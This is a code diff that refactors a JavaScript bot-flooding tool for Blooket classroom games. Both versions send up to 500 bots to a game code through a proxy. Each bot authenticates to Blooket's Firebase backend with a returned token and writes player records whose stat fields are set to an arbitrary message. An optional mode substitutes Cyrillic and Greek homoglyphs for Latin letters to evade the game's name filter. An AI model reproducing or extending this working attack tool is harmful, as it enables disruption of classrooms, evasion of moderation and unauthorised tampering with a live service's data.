@@ -8,7 +8,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-
     const navLinks = document.querySelectorAll('nav a');
     navLinks.forEach(link => {
         link.addEventListener('click', function() {
@@ -116,174 +115,160 @@ document.addEventListener('DOMContentLoaded', function() {
 
 const blooks = [
     "1#0#1#0#1$3#0#0#1#6#0#0$0", "Old Boot", "Jellyfish", "Clownfish", "Frog", "Crab", "Pufferfish", "Blobfish", "Octopus", "Narwhal", "Dolphin", "Baby Shark", "Megalodon", "Snowy Owl", "Polar Bear", "Arctic Fox", "Baby Penguin", "Penguin", "Arctic Hare", "Seal", "Walrus", "Snow Globe", "Holiday Gift", "Hot Chocolate", "Holiday Wreath", "Stocking", "Gingerbread Man", "Gingerbread House", "Reindeer", "Snowman", "Santa Claus", "Lil Bot", "Lovely Bot", "Angry Bot", "Happy Bot", "Watson", "Buddy Bot", "Brainy Bot", "Mega Bot", "Toast", "Cereal", "Yogurt", "Breakfast Combo", "Orange Juice", "Milk", "Waffle", "Pancakes", "French Toast", "Pizza", "Light Blue", "Black", "Red", "Purple", "Pink", "Orange", "Lime", "Green", "Teal", "Tan", "Maroon", "Gray", "Mint", "Salmon", "Burgandy", "Baby Blue", "Dust", "Brown", "Dull Blue", "Yellow", "Blue", "Amber", "Dino Egg", "Dino Fossil", "Stegosaurus", "Velociraptor", "Brontosaurus", "Triceratops", "Tyrannosaurus Rex", "Chick", "Chicken", "Cow", "Goat", "Horse", "Pig", "Sheep", "Duck", "Alpaca", "Bear", "Moose", "Fox", "Raccoon", "Squirrel", "Owl", "Hedgehog", "Deer", "Wolf", "Beaver", "Rainbow Jellyfish", "Blizzard Clownfish", "Lovely Frog", "Lucky Frog", "Spring Frog", "Poison Dart Frog", "Lucky Hamster", "Chocolate Rabbit", "Lemon Crab", "Pirate Pufferfish", "Donut Blobfish", "Crimson Octopus", "Rainbow Narwhal", "Frost Wreath", "Tropical Globe", "New York Snow Globe", "London Snow Globe", "Japan Snow Globe", "Egypt Snow Globe", "Paris Snow Globe", "Red Sweater Snowman", "Blue Sweater Snowman", "Elf Sweater Snowman", "Santa Claws", "Cookies Combo", "Chilly Flamingo", "Snowy Bush Monster", "Nutcracker Koala", "Sandwich", "Ice Slime", "Frozen Fossil", "Ice Crab", "Rainbow Panda", "White Peacock", "Tiger Zebra", "Teal Platypus", "Red Astronaut", "Orange Astronaut", "Yellow Astronaut", "Lime Astronaut", "Green Astronaut", "Cyan Astronaut", "Blue Astronaut", "Pink Astronaut", "Purple Astronaut", "Brown Astronaut", "Black Astronaut", "Lovely Planet", "Lovely Peacock", "Haunted Pumpkin", "Pumpkin Cookie", "Ghost Cookie", "Red Gummy Bear", "Blue Gummy Bear", "Green Gummy Bear", "Chick Chicken", "Chicken Chick", "Raccoon Bandit", "Owl Sheriff", "Vampire Frog", "Pumpkin King", "Anaconda Wizard", "Spooky Pumpkin", "Spooky Mummy", "Agent Owl", "Master Elf", "Party Pig", "Wise Owl", "Spooky Ghost", "Phantom King", "Tim the Alien", "Rainbow Astronaut", "Hamsta Claus", "Ice Bat", "Ice Bug", "Ice Elemental", "Rock Monster", "Dink", "Donk", "Bush Monster", "Yeti", "Witch", "Wizard", "Elf", "Fairy", "Slime Monster", "Jester", "Dragon", "Queen", "Unicorn", "King", "Dingo", "Echidna", "Koala", "Kookaburra", "Platypus", "Joey", "Kangaroo", "Crocodile", "Sugar Glider", "Dog", "Cat", "Rabbit", "Goldfish", "Hamster", "Turtle", "Kitten", "Puppy", "Panda", "Sloth", "Tenrec", "Flamingo", "Zebra", "Elephant", "Lemur", "Peacock", "Chameleon", "Lion", "Earth", "Meteor", "Stars", "Alien", "Planet", "UFO", "Spaceship", "Astronaut", "Pumpkin", "Swamp Monster", "Frankenstein", "Vampire", "Zombie", "Mummy", "Caramel Apple", "Candy Corn", "Werewolf", "Ghost", "Tiger", "Orangutan", "Cockatoo", "Parrot", "Anaconda", "Jaguar", "Macaw", "Toucan", "Panther", "Capuchin", "Gorilla", "Hippo", "Rhino", "Giraffe", "Two of Spades", "Eat Me", "Drink Me", "Alice", "Queen of Hearts", "Dormouse", "White Rabbit", "Cheshire Cat", "Caterpillar", "Mad Hatter", "King of Hearts", "Deckhand", "Buccaneer", "Swashbuckler", "Treasure Map", "Seagull", "Jolly Pirate", "Pirate Ship", "Kraken", "Captain Blackbeard"
-       ];
-   
-       const blookInput = document.getElementById('blookInput');
-       const blooksList = document.getElementById('blooksList');
-   
-       // Populate datalist with blook options
-       blooks.forEach(blook => {
-           const option = document.createElement('option');
-           option.value = blook;
-           blooksList.appendChild(option);
-       });
-   
-       // Add input filtering
-       blookInput.addEventListener('input', function() {
-           const inputValue = this.value.toLowerCase();
-           const options = blooksList.querySelectorAll('option');
-           
-           // Show matching options
-           options.forEach(option => {
-               if (option.value.toLowerCase().includes(inputValue)) {
-                   option.hidden = false;
-               } else {
-                   option.hidden = true;
-               }
-           });
-       });
-   
-       // Add click handler to show all options when clicked
-       blookInput.addEventListener('click', function() {
-           if (this.value === '') {
-               const options = blooksList.querySelectorAll('option');
-               options.forEach(option => option.hidden = false);
-           }
-       });
-   
-           function randomLetters() {
-           const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-           let result = '';
-           for (let k = 0; k < 2; k++) {
-               result += chars.charAt(Math.floor(Math.random() * chars.length));
-           }
-           return result;
-       }
-   
-       async function send() {
-           const gameId = document.getElementById('gcode').value.trim();
-           const baseName = `\x20` + `\x20` + document.getElementById('gname').value.trim();
-           const numBots = parseInt(document.getElementById('gnum').value);
-           const selectedBlook = document.getElementById('blookInput').value;
-           const bypassFilter = document.getElementById('bcf').hasAttribute('checked');
-           const botMsg = document.getElementById('botmsg').value.trim();
-           
-           const log = document.getElementById('log');
-           log.innerHTML = "Starting flood...<br>";
-           
-           
-           if (isNaN(numBots) || numBots < 1 || numBots > 500) {
-               log.innerHTML += "❌ Please enter a valid number of bots (1-500).<br>";
-               return;
-           }
-           
-           document.getElementById('status').textContent = "Status: Flooding...";
-           
-           const batchSize = 50;
-           const delayBetweenBatches = 500;
-           
-           for (let i = 0; i < numBots; i += batchSize) {
-               const currentBatchSize = Math.min(batchSize, numBots - i);
-               const batchPromises = [];
-               
-               for (let j = 0; j < currentBatchSize; j++) {
-                   const botName = String.fromCharCode(32) + String.fromCharCode(32) + `${baseName}${randomLetters()}`;
-                   batchPromises.push(sendBot(gameId, botName, selectedBlook, bypassFilter, botMsg, log));
-               }
-               
-               await Promise.all(batchPromises);
-               await new Promise(resolve => setTimeout(resolve, delayBetweenBatches));
-           }
-           
-           log.innerHTML += `<br>🎉 Successfully sent ${numBots} bots to game ${gameId}!`;
-           document.getElementById('status').textContent = "Status: Flood complete!";
-       }
-   
-       async function sendBot(gameId, botName, blook, bypassFilter, botMsg, log) {
-           try {
-               let submitName = botName;
-               
-   if (bypassFilter) {
-       submitName = botName
-           .replace(/a/g, "\u0430")  // Cyrillic 'а'
-           .replace(/c/g, "\u0441")  // Cyrillic 'с'
-           .replace(/e/g, "\u0435")  // Cyrillic 'е'
-           .replace(/i/g, "\u0456")  // Cyrillic 'і'
-           .replace(/o/g, "\u043E")  // Cyrillic 'о'
-           .replace(/p/g, "\u0440")  // Cyrillic 'р'
-           .replace(/s/g, "\u0455")  // Cyrillic 'ѕ'
-           .replace(/x/g, "\u0445")   // Cyrillic 'х'
-           .replace(/y/g, "\u0443")   // Cyrillic 'у'
-           .replace(/A/g, "\u0410")   // Cyrillic 'А'
-           .replace(/B/g, "\u0412")   // Cyrillic 'В'
-           .replace(/C/g, "\u0421")   // Cyrillic 'С'
-           .replace(/E/g, "\u0415")   // Cyrillic 'Е'
-           .replace(/H/g, "\u041D")   // Cyrillic 'Н'
-           .replace(/I/g, "\u0406")   // Cyrillic 'І'
-           .replace(/K/g, "\u039A")   // Greek 'Κ'
-           .replace(/M/g, "\u041C")   // Cyrillic 'М'
-           .replace(/O/g, "\u041E")   // Cyrillic 'О'
-           .replace(/P/g, "\u0420")   // Cyrillic 'Р'
-           .replace(/S/g, "\u0405")   // Cyrillic 'Ѕ'
-           .replace(/T/g, "\u0422")   // Cyrillic 'Т'
-           .replace(/X/g, "\u0425")   // Cyrillic 'Х'
-           .replace(/Y/g, "\u03A5");  // Greek 'Υ'
-   
-   
-   }
-   
-               const response = await fetch("https://shard-uttermost-crystal.glitch.me/proxy/https://blooketbot.me/join", {
-                   method: "POST",
-                   headers: { "Content-Type": "application/json" },
-                   body: JSON.stringify({ 
-                       id: gameId, 
-                       name: submitName
-                   })
-               });
-               
-               const data = await response.json();
-               
-               if (data.success) {
-                   const liveApp = firebase.initializeApp({
-                       apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
-                       authDomain: "blooket-2020.firebaseapp.com",
-                       projectId: "blooket-2020",
-                       storageBucket: "blooket-2020.appspot.com",
-                       messagingSenderId: "741533559105",
-                       appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
-                       databaseURL: data.fbShardURL
-                   }, `app_${Math.random().toString(36).substring(7)}`);
-                   
-                   await firebase.auth(liveApp).signInWithCustomToken(data.fbToken);
-                   const db = firebase.database(liveApp);            
-                   await db.ref(`${gameId}/c/${submitName}`).set({ 
-                       b: blook,
-                       cr: botMsg,
-                       g: botMsg,
-                       f: botMsg,
-                       w: botMsg,
-                       d: botMsg,
-                       xp: botMsg,
-                       c: botMsg,
-                       ca: botMsg,
-                   });
-                    if (blook) {                
-                   await db.ref(`${gameId}/c/${submitName}`).set({ 
-                       b: blook,
-   
-                   })} else { await db.ref(`${gameId}/c/${submitName}`).set({ 
-                       b: "Mega Bot",
-   
-                   })};
-   
-   
-                   
-                   
-                   log.innerHTML += `✅ ${botName} joined successfully<br>`;
-               } else {
-                   log.innerHTML += `⚠️ ${botName} failed: ${data.msg || "Unknown error"}<br>`;
-               }
-           } catch (error) {
-               log.innerHTML += `❌ Error with ${botName}: ${error.message}<br>`;
-           }
-       }
+];
+
+const blookInput = document.getElementById('blookInput');
+const blooksList = document.getElementById('blooksList');
+
+blooks.forEach(blook => {
+    const option = document.createElement('option');
+    option.value = blook;
+    blooksList.appendChild(option);
+});
+
+blookInput.addEventListener('input', function() {
+    const inputValue = this.value.toLowerCase();
+    blooksList.querySelectorAll('option').forEach(option => {
+        option.hidden = !option.value.toLowerCase().includes(inputValue);
+    });
+});
+
+blookInput.addEventListener('click', function() {
+    if (this.value === '') {
+        blooksList.querySelectorAll('option').forEach(option => option.hidden = false);
+    }
+});
+
+function randomLetters() {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+    return Array.from({length: 2}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+}
+
+async function send() {
+    const gameId = document.getElementById('gcode').value.trim();
+    const baseName = `  ${document.getElementById('gname').value.trim()}`;
+    const numBots = parseInt(document.getElementById('gnum').value);
+    const selectedBlook = document.getElementById('blookInput').value;
+    const bypassFilter = document.getElementById('bcf').checked;
+    const botMsg = document.getElementById('botmsg').value.trim();
+    const log = document.getElementById('log');
+    
+    log.innerHTML = "Starting flood...<br>";
+    document.getElementById('status').textContent = "Status: Initializing...";
+
+    if (!gameId) {
+        log.innerHTML += "❌ Please enter a valid Game ID<br>";
+        return;
+    }
+
+    if (isNaN(numBots) || numBots < 1 || numBots > 500) {
+        log.innerHTML += "❌ Invalid number of bots (1-500)<br>";
+        return;
+    }
+
+    const batchSize = 50;
+    const delayBetweenBatches = 1000;
+    let successCount = 0;
+
+    try {
+        for (let i = 0; i < numBots; i += batchSize) {
+            const currentBatchSize = Math.min(batchSize, numBots - i);
+            const batchPromises = [];
+            
+            for (let j = 0; j < currentBatchSize; j++) {
+                const botName = `${baseName}${randomLetters()}`;
+                batchPromises.push(sendBot(gameId, botName, selectedBlook, bypassFilter, botMsg, log));
+            }
+
+            await Promise.all(batchPromises);
+            successCount += currentBatchSize;
+            log.innerHTML += `✅ Sent ${currentBatchSize} bots (Total: ${successCount})<br>`;
+            await new Promise(resolve => setTimeout(resolve, delayBetweenBatches));
+        }
+
+        log.innerHTML += `<br>🎉 Successfully sent ${successCount} bots!`;
+        document.getElementById('status').textContent = "Status: Flood complete!";
+
+    } catch (error) {
+        log.innerHTML += `<br>❌ Critical error: ${error.message}<br>`;
+        document.getElementById('status').textContent = "Status: Error occurred!";
+    }
+}
+
+async function sendBot(gameId, botName, blook, bypassFilter, botMsg, log) {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 8000);
+
+    try {
+        let submitName = botName;
+        
+        if (bypassFilter) {
+            submitName = botName.replace(/[aceiopstxyABCEHIKMOPSXY]/g, char => {
+                const replacements = {
+                    'a': '\u0430', 'c': '\u0441', 'e': '\u0435', 'i': '\u0456',
+                    'o': '\u043E', 'p': '\u0440', 's': '\u0455', 't': '\u0442',
+                    'x': '\u0445', 'y': '\u0443', 'A': '\u0410', 'B': '\u0412',
+                    'C': '\u0421', 'E': '\u0415', 'H': '\u041D', 'I': '\u0406',
+                    'K': '\u039A', 'M': '\u041C', 'O': '\u041E', 'P': '\u0420',
+                    'S': '\u0405', 'T': '\u0422', 'X': '\u0425', 'Y': '\u03A5'
+                };
+                return replacements[char] || char;
+            });
+        }
+
+        const response = await fetch("https://shard-uttermost-crystal.glitch.me/proxy/https://blooketbot.me/join", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ id: gameId, name: submitName }),
+            signal: controller.signal
+        });
+        clearTimeout(timeoutId);
+
+        const responseText = await response.text();
+        let data;
+        try {
+            data = JSON.parse(responseText);
+        } catch {
+            throw new Error('Invalid server response');
+        }
+
+        if (!response.ok || !data.success) {
+            throw new Error(data.msg || `HTTP error ${response.status}`);
+        }
+
+        const liveApp = firebase.initializeApp({
+            apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
+            authDomain: "blooket-2020.firebaseapp.com",
+            projectId: "blooket-2020",
+            storageBucket: "blooket-2020.appspot.com",
+            messagingSenderId: "741533559105",
+            appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
+            databaseURL: data.fbShardURL
+        }, `app_${Math.random().toString(36).slice(2)}`);
+
+        await firebase.auth(liveApp).signInWithCustomToken(data.fbToken);
+        const db = firebase.database(liveApp);
+        
+        await db.ref(`${gameId}/c/${submitName}`).update({
+            b: blook || "Mega Bot",
+            cr: botMsg,
+            g: botMsg,
+            f: botMsg,
+            w: botMsg,
+            d: botMsg,
+            xp: botMsg,
+            c: botMsg,
+            ca: botMsg
+        });
+
+        return true;
+
+    } catch (error) {
+        log.innerHTML += `❌ ${botName}: ${error.message.substring(0, 50)}<br>`;
+        return false;
+    } finally {
+        if (firebase.apps.length > 1) {
+            firebase.apps[1].delete();
+        }
+    }
+}
